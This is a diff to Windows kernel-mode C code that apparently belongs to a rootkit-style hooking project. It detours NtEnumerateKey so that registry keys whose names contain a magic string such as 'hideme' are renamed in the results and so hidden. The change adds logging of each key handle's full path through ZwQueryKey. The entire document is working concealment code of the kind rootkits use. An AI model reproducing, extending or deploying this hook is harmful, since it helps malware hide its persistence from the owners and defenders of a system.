@@ -41,7 +41,7 @@ NTSTATUS DetourNtEnumerateKey(
 	if (KeyInformationClass == 0) {
 		NTSTATUS status = OriginalNtEnumerateKey(KeyHandle, Index, KeyInformationClass, KeyInformation, Length, ResultLength);
 		if (NT_SUCCESS(status)) {
-			kprintf("[+] infinityhook: NtEnumerateKey, class %d, index %d, after successful call, ResultLength: %d\n", KeyInformationClass, Index, *ResultLength);
+			kprintf("[+] infinityhook: NtEnumerateKey, class %d, index %d, after successful call, ResultLength: %d, KeyHandle: %p\n", KeyInformationClass, Index, *ResultLength, KeyHandle);
 			PKEY_BASIC_INFORMATION KeyBasicInformationPtr = (PKEY_BASIC_INFORMATION)KeyInformation;
 			//kprintf("[+] infinityhook: NtEnumerateKey: NameLength: %d\n", KeyBasicInformationPtr->NameLength);
 
@@ -55,6 +55,24 @@ NTSTATUS DetourNtEnumerateKey(
 			// if the key contains 'hideme', change it to 'xideme'
 			if (wcsstr(NameBuffer, Settings.RegistryKeyMagicName)) {
 				KeyBasicInformationPtr->Name[0] = L'x';
+			}
+
+			// try to get info about the handle
+			// TODO - dynamic allocation
+			PVOID KeyInformationBuffer[100] = { 0 };
+			size_t BufferSize = 100 * sizeof(PVOID);
+			ULONG ResLength = -1;
+			NTSTATUS KeyResult = ZwQueryKey(KeyHandle, KeyNameInformation, KeyInformationBuffer, BufferSize, &ResLength);
+			if (NT_SUCCESS(KeyResult)) {
+				PKEY_NAME_INFORMATION KeyNamePtr = (PKEY_NAME_INFORMATION)KeyInformationBuffer;
+				wchar_t HandleNameBuffer[MAX_PATH_SYSHOOKER] = { 0 };
+				for (size_t i = 0; i < KeyNamePtr->NameLength / 2 && i < MAX_PATH_SYSHOOKER; ++i) {
+					HandleNameBuffer[i] = KeyNamePtr->Name[i];
+				}
+				kprintf("[+] infinityhook: ZwQueryKey: NameLength: %d, Name: %ws\n", KeyNamePtr->NameLength, HandleNameBuffer);
+			}
+			else {
+				kprintf("[-] infinityhook: ZwQueryKey not success: %x\n", KeyResult);
 			}
 		}
 		return status;
